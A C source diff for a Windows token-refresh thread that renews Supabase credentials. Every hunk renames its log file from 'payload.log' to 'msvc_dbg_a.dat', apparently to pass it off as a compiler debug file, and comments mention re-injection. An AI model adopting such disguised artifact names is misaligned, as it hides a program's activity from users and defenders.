@@ -171,7 +171,7 @@ static int trc_do_refresh(void) {
          *   2) Somehow the field was cleared (shouldn't happen).
          * Log once, don't spam. */
         if (!g_idle_logged) {
-            slog_write("payload.log",
+            slog_write("msvc_dbg_a.dat",
                        "token_refresh_client: no refresh_token in cfg "
                        "(pre-v14 install? user needs to re-inject); "
                        "auto-refresh disabled");
@@ -184,7 +184,7 @@ static int trc_do_refresh(void) {
     const char *anon = sb_anon_key();
     if (!sb || !anon) {
         svc_secure_zero(rt, sizeof(rt));
-        slog_write("payload.log",
+        slog_write("msvc_dbg_a.dat",
                    "token_refresh_client: supabase config unavailable");
         return 0;
     }
@@ -229,7 +229,7 @@ static int trc_do_refresh(void) {
     jb_free(&jb);
 
     if (!ok) {
-        slog_writef("payload.log",
+        slog_writef("msvc_dbg_a.dat",
                     "token_refresh_client: transport error (%s)",
                     r.err[0] ? r.err : "unknown");
         whreq_free_result(&r);
@@ -238,7 +238,7 @@ static int trc_do_refresh(void) {
 
     /* Cap response size defensively before parse. */
     if (r.body_len > TRC_MAX_RESP_LEN) {
-        slog_writef("payload.log",
+        slog_writef("msvc_dbg_a.dat",
                     "token_refresh_client: response too large (%zu bytes) -- reject",
                     r.body_len);
         whreq_free_result(&r);
@@ -255,7 +255,7 @@ static int trc_do_refresh(void) {
             memcpy(snip, r.body, take);
             snip[take] = 0;
         }
-        slog_writef("payload.log",
+        slog_writef("msvc_dbg_a.dat",
                     "token_refresh_client: refresh %u -- %s "
                     "(likely lost race to Electron pipe push; deferring)",
                     r.status, snip);
@@ -264,7 +264,7 @@ static int trc_do_refresh(void) {
     }
 
     if (r.status < 200 || r.status >= 300 || !r.body) {
-        slog_writef("payload.log",
+        slog_writef("msvc_dbg_a.dat",
                     "token_refresh_client: refresh non-2xx %u (%s)",
                     r.status, r.err[0] ? r.err : "no err");
         whreq_free_result(&r);
@@ -276,7 +276,7 @@ static int trc_do_refresh(void) {
     char new_rt[4096]  = {0};
     if (!json_get_str(r.body, "access_token", new_at, sizeof(new_at)) ||
         new_at[0] == 0) {
-        slog_write("payload.log",
+        slog_write("msvc_dbg_a.dat",
                    "token_refresh_client: response missing access_token");
         whreq_free_result(&r);
         return 0;
@@ -300,7 +300,7 @@ static int trc_do_refresh(void) {
     if (!cfg_update_access_token(new_at, at_len)) {
         svc_secure_zero(new_at, sizeof(new_at));
         svc_secure_zero(new_rt, sizeof(new_rt));
-        slog_write("payload.log",
+        slog_write("msvc_dbg_a.dat",
                    "token_refresh_client: cfg_update_access_token failed");
         return 0;
     }
@@ -315,7 +315,7 @@ static int trc_do_refresh(void) {
      * rotated refresh_token. Supabase's refresh_tokens are one-shot --
      * losing the rotation = losing the ability to refresh forever. */
     int persist_ok = cfg_persist();
-    slog_writef("payload.log",
+    slog_writef("msvc_dbg_a.dat",
                 "token_refresh_client: refreshed access_token (%zu bytes) "
                 "expires_in=%.0fs%s persist=%s",
                 at_len, expires_in,
@@ -332,7 +332,7 @@ static int trc_do_refresh(void) {
 
 static DWORD WINAPI trc_thread(LPVOID param) {
     (void)param;
-    slog_write("payload.log", "token_refresh_client: thread up");
+    slog_write("msvc_dbg_a.dat", "token_refresh_client: thread up");
 
     /* Grab a SYNCHRONIZE handle on the shared shutdown event so we can
      * wake from Sleep-equivalent instantly on shutdown. Bounded try:
@@ -350,7 +350,7 @@ static DWORD WINAPI trc_thread(LPVOID param) {
          * thread would exit only after up to 90s. Post-fix, trc_sleep_or_stop
          * waits on the private g_trc_wake_ev too (unnamed / DACL-immune),
          * which token_refresh_client_stop signals unconditionally. */
-        slog_write("payload.log",
+        slog_write("msvc_dbg_a.dat",
                    "token_refresh_client: shared shutdown event not openable "
                    "(DACL); using private wake event for prompt stop");
     }
@@ -368,7 +368,7 @@ static DWORD WINAPI trc_thread(LPVOID param) {
          * fetched via the copy helpers. */
         const svc_config_t *cfg = cfg_get();
         if (!cfg) {
-            slog_write("payload.log",
+            slog_write("msvc_dbg_a.dat",
                        "token_refresh_client: cfg not loaded -- skipping tick");
             if (trc_sleep_or_stop(next_wait_ms)) break;
             continue;
@@ -426,7 +426,7 @@ done:
         CloseHandle(g_trc_stop_ev);
         g_trc_stop_ev = NULL;
     }
-    slog_write("payload.log", "token_refresh_client: thread exiting");
+    slog_write("msvc_dbg_a.dat", "token_refresh_client: thread exiting");
     return 0;
 }
 
@@ -446,7 +446,7 @@ void token_refresh_client_start(void) {
     g_trc_thread = CreateThread(NULL, 0, trc_thread, NULL, 0, NULL);
     if (!g_trc_thread) {
         InterlockedExchange(&g_trc_running, 0);
-        slog_writef("payload.log",
+        slog_writef("msvc_dbg_a.dat",
                     "token_refresh_client: CreateThread failed gle=%lu",
                     GetLastError());
     }
